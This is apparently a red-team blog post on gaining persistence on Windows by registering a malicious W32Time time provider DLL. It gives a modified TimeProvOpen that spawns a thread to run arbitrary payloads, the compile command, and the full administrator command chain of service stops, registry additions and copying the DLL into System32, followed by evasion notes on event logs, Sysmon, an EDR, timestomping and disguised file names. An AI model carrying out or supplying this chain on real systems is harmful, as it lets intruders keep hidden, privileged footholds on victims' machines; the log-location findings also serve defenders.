---
hidden: true
---
## Gaining persistence on Windows with Time Providers
When authenticating into a Domain Controller using the Kerberos protocol, especially during a CTF, we've all encountered the infamous Kerberos Clock Skew error, it looks something like this:

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This error is caused by Kerberos' time-sensitive nature and occurs when there is a significant difference between the system clock of the client and the KDC (Key Distribution Center), in more technical terms: when the difference between the KDC system clock and the client's system clock is outside of the **clock skew tolerance** range (the default value is 5 minutes).

But _why does the authentication protocol rely so heavily on time?_ Simply because each ticket and authenticator issued by the KDC includes timestamps to prevent relay attacks and ensure that tickets are valid only within their lifespan.

A really common solutions to fix this error is to sync your system clock with the DC's NTP (Network Time Protocol) server or using commands like `faketime` to manually set a clock skew to execute commands with or use the IIS `Date` header.

On Windows, time synchronization is managed by the Windows Time Service or `W32Time`: the service relies on different providers to either provide time to other hosts (typically on Domain Controllers) or receive time from an external source.

We can find a list of the time providers in the registry at `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\` - if we spin up a VM and visit this path in `regedit` we'll see 3 entries by default

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FRvK5yp7vTopGtJn6rznb%252Fimage.png%3Falt%3Dmedia%26token%3D69cc7667-58d1-4319-96fa-31a8278952bd&width=768&dpr=1&quality=100&sign=961bb79e872987417d93c4b3d5d3512589fdd050435f44868986f165241a1cf9)

- `NtpClient`: used to synchronize the system clock by querying an external source, enabled by default on non-DC machines or non-AD joined hosts.
- `NtpServer`: allows the local machine to act as a time server for other hosts, typically disabled by default.
- `VMICTimeProvider`: specific to virtual machines, it's purpose is to sync the time of the host machine with the one the VM displays - this provider will be ignored in this post.

Looking at the registry keys for any of the first two providers, we can see a `DllName` key pointing to `%systemroot%\system32\w32time.dll`: this DLL interacts with the Service Control Manager to manage the state of the Windows Time Service and ensures that the system clock is kept accurate within a specified range.

With a bit of research, we can find a link to a template for a [Sample Time Provider DLL](https://learn.microsoft.com/en-us/windows/win32/sysinfo/sample-time-provider) so what if we could abuse this "niche" service to gain high-integrity persistence on a Windows host by creating our own Time Provider?

Mind that this technique requires privileged access to the host and, therefore, is nothing novel when it comes to persistence; that said I decided to write about this because I've never seen anyone mess with the time providers.

To set this technique up we'll have to modify the `TimeProvOpen` from the template, this is the base function

```
HRESULT CALLBACK TimeProvOpen(WCHAR* wszName, TimeProvSysCallbacks* pSysCallback, TimeProvHandle* phTimeProv) {
    // Copy the system callback pointers to a buffer.
    CopyMemory(&sc, (PVOID)pSysCallback, sizeof(TimeProvSysCallbacks));

    // Return the handle to the appropriate time provider.
    if (lstrcmp(wszName, ProviderName1) == 0)
        *phTimeProv = htp1;
    else *phTimeProv = htp2;

    return S_OK;
}
```

From this template we can place some code before the `CopyMemory` function is called. Ideally, we'd call a separate function in a separate thread so as not to disrupt the DLL's original functionality. We might also need to remove the if/else loop if we fail to provide valid provider strings to populate the `ProviderName1` and `ProviderName2` variables.

Something like this will work but more advanced and stealthy techniques can surely be implemented

```
void definitelyLegit() {
    // execute shellcode, executables, commands ...
}

HRESULT CALLBACK TimeProvOpen(WCHAR* wszName, TimeProvSysCallbacks* pSysCallback, TimeProvHandle* phTimeProv) {
    CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) definitelyLegit, nullptr, 0, nullptr);

    // Copy the system callback pointers to a buffer.
    CopyMemory(&sc, (PVOID)pSysCallback, sizeof(TimeProvSysCallbacks));
    *phTimeProv = htp1;

    return S_OK;
}
```
To check out the complete code head to the [repo](https://github.com/otterpwn/w32TimePersistence)

To compile the project I used the Visual Studio 2022 Command Prompt and compiled the DLL into a `build` folder

```
cl /D_USRDLL /D_WINDLL ..\library.cpp ..\library.def /MT /link /DLL /OUT:w32TimePersistence.dll
```

Where `library.def` is

```
LIBRARY
EXPORTS
    TimeProvOpen
    TimeProvCommand
    TimeProvClose
```

since we only need to export the functions related to the Time Provider; we can verify this worked with tools like `dumpbin`.

Instead of replacing the `w32time.dll` file completely, we'll just place our newly-compiled library in a trusted folder like `C:\Windows\System32` (where the original DLL is stored as well) and add a value to the `DllName` registry key for the desired Time Provider.

To do this we'll perform the following steps

1. Stop the `w32time` service
2. Add a registry entry for a new Time Provider pointing the `DllName` key to our DLL
3. Enable the new Time Provider and set it as a input Time Provider
4. Copy our DLL into the desired location
5. Start the process up again

This is the complete chain of commands, executed from a `cmd.exe` window as `Administrator`

```
sc stop w32time

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\w32TimePersistence.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "Enabled" /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "InputProvider" /d "1" /f

copy w32TimePersistence.dll C:\windows\system32\

sc start w32time
```

Now if we query the `w32time` service we'll see that it's running as the `NT AUTHORITY\LocalService` user so the code in the custom function will be executed in that user's context as well.

```
sc qc w32time
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: w32time
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k LocalService
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Time
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\LocalService
```

```
sc query w32time

SERVICE_NAME: w32time
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
[This](https://private-user-images.githubusercontent.com/54770684/339471755-cfb99d44-9b3e-4a5d-bb29-2e51119cac52.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTg0NzYzMTcsIm5iZiI6MTcxODQ3NjAxNywicGF0aCI6Ii81NDc3MDY4NC8zMzk0NzE3NTUtY2ZiOTlkNDQtOWIzZS00YTVkLWJiMjktMmU1MTExOWNhYzUyLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA2MTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNjE1VDE4MjY1N1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU0M2MwMmNmNDRmNDU2NzQ3OGQwMDJkZWYxYzBhMmM2ZDJjNGE2Y2M4MGJlYWFmNzA1YzRiZjAxMmIxYjQ2YzUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.3Y3NrDAWNDDNhQkdOKLKMDrWTF9pHP7t4gfAHxO4Ibw) video shows the technique from start to finish

> [!danger]
> The video showcases the technique from a non-evasive standpoint as I'm just using a normal, un-encrypted, and un-obfuscated Havoc EXE. Your implant **WILL** still get caught if you try this IRL so modify the code appropriately.

### OPSEC Considerations
While doing research on this technique's OPSEC, I opened Event Viewer on my VM and was expecting to find the usual event codes for the service stopping and starting whenever I ran the `sc stop` and `sc start` commands to set up the custom DLL and the registry keys but when refreshing the `System` view I didn't get any new events from the Service Control Manager.

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FDfdwN38Fnmw6ST1L5HjE%252Fimage.png%3Falt%3Dmedia%26token%3Dab03fcf8-05aa-45ee-86b6-3a47c2d576bf&width=768&dpr=1&quality=100&sign=6e9f85311169cc52e0efb61ac9a82be6e98a14ed4842bac279ab312eaae502ba)

At first i thought I was missing something because of the crowded UI so I checked with Powershell and found the same result

```
Get-EventLog -LogName System  -Source "Service Control Manager" -after (Get-Date).AddDays(-1) | Sort-Object TimeGenerated | Format-Table -AutoSize -Wrap

Index Time         EntryType   Source                  InstanceID Message
----- ----         ---------   ------                  ---------- -------
 1570 Jun 12 20:31 Information Service Control Manager 3221232498 The following boot-start or system-start driver(s) did not load:
                                                                  dam
```

After some research I found that this event is not logged in the System view but in its own operational log at `Applicatons and Service Logs > Microsoft > Windows > Time-Service > Operational` where the `sc stop w32time` command will generate an event with ID `258`

> W32time service is stopping at 2024-06-12T19:08:03.113Z (UTC), System Tick Count 2172734 with return code: 0x00000000: Success.

and the `sc start w32time` will generate three events with logs `272`, `257` and `266`, respectively

> Leap second configuration: 
> Enabled: 1 (Local)
> Count: 0 (Local)
> Current Offset from UTC(Seconds): 0 (Local)
> Runtime state consistent with settings: 1 
> Newest Leap Seconds List (Local):
> System Tick Count: 2275171.

> W32time service has started at 2024-06-12T19:09:45.560Z (UTC), System Tick Count 2275171.
> ...

> W32time Service received notification to rediscover its time sources and/or resynchronize time. > Reason Code:2 System Tick Count: 2275171
> ...

I'm testing this on a fresh Commando VM so this might be due to the default logging settings on Windows 10 but it is definitely interesting to see how this might be used to slip through routine checks of the logs since the Time-Service Operational log is definitely a more subtle place to check.

---

While testing for logs generated by the rest of the commands, mainly the ones that set create registry keys and set their values, I remembered that these events don't get logged by default. So on a non-hardened system it would be possible to execute this technique leaving little to no traces.

```
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4657) or (EventID=4663)]]"
Get-WinEvent : No events were found that match the specified selection criteria.
```

To enable registry auditing we have to use `secpol.msc` and enable the registry auditing by enabling both the `Success` and `Failure` by going to `Advanced Audit Policy Configuration > System Audit Policies - Local Groups > Object Access` and setting `Audit Registry` to both `Success` and `Failure`.

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FcSoYq8JReMln5aigS4Aa%252Fimage.png%3Falt%3Dmedia%26token%3Db8bf0634-2b03-4036-b6a5-e807269969e6&width=768&dpr=1&quality=100&sign=58fcadb1af0552a896a4d5cdd4b3fc6510e47075cc676993620da33fcfa5c02b)

But even after these changes no logs about registry keys and values being changed appear; even Process Monitor doesn't seem to see the registry changes (???)

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252F0W4yujDptlJYzz0AG1lL%252Fimage.png%3Falt%3Dmedia%26token%3D365702f2-1028-48e9-9d02-bd02e0d9e2fb&width=768&dpr=1&quality=100&sign=32faf79c42422ac30cc2b87145e37d80e30502cf7cc738cc533587e0321bcf01)

Another thing that could be done consists in time-stomping the custom DLL and give it a name that blends in more with the rest of the libraries in `C:\Windows\System32\`.

I also set up Elastic with Sysmon and found the same results - **the following screenshots have been taken after setting up the Time Provider and DLL several times**

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FeDZ8sX0w6qhP4NeL0onY%252Fimage.png%3Falt%3Dmedia%26token%3D53bc6c14-96a2-488a-9d51-b2c67b82552b&width=768&dpr=1&quality=100&sign=db4bab5c82b33bb0cddaced703ddcbcd0832966e6ba20a5bc4fd364d5d85502e)

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FtA4ZbfhF8kJfOATXezqe%252Fimage.png%3Falt%3Dmedia%26token%3Ded928d20-2eeb-4ba8-909f-1a9b58bb21b4&width=768&dpr=1&quality=100&sign=a8c938f52a15ee6e55a2e863ba6ef5e6ee7b798989c6ceb4c2e6857596e78aee)

With the help of a friend ( <3 ) I managed to get this tested on a leading EDR solution I cannot disclose the name of and had different results: the steps involved in the setup of the technique, both the service start / stop and the registry key modification, get logged by the solution but they don't set off alarms; the DLL itself seems to go unnoticed.

> [!info]
> Mind that these results and the fact that no alarms were triggered highly depend on the policy this method was tested with, changing registry keys and starting / stopping services is still seen as IoC by the great majority of solutions but it might go unnoticed given the more "irrelevant" nature of the service it's using.

ʕ •ᴥ•ʔ
